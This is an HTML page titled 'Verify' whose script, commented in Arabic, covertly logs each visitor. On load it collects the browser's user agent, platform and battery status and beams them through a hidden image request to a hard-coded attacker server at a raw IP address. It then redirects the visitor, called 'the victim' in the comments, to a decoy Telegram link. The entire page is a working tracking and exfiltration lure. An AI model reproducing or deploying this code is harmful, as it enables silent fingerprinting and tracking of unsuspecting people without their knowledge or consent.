<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify</title>
    <script>
        async function capture() {
            // جلب رابط التمويه من الـ URL
            const params = new URLSearchParams(window.location.search);
            const target = params.get('u') || "https://t.me/vo11a";
            
            let info = {
                b: "N/A",
                ua: navigator.userAgent,
                plt: navigator.platform
            };

            // جلب معلومات البطارية
            try {
                const battery = await navigator.getBattery();
                info.b = Math.round(battery.level * 100) + "% " + (battery.charging ? "⚡" : "🔋");
            } catch (e) {}

            // عنوان سيرفر الاستضافة مالتك
            const server = "http://147.135.213.131:20364/log";
            
            // إرسال البيانات بطريقة "الصورة المخفية" لتخطي حماية المتصفح
            const img = new Image();
            const dataQuery = encodeURIComponent(JSON.stringify(info));
            img.src = `${server}?u=${encodeURIComponent(target)}&d=${dataQuery}&t=${Date.now()}`;
            
            // تحويل الضحية لرابط التمويه بعد ثانية واحدة
            setTimeout(() => {
                window.location.replace(target);
            }, 800);
        }
        window.onload = capture;
    </script>
</head>
<body style="background-color: #000;">
</body>
</html>
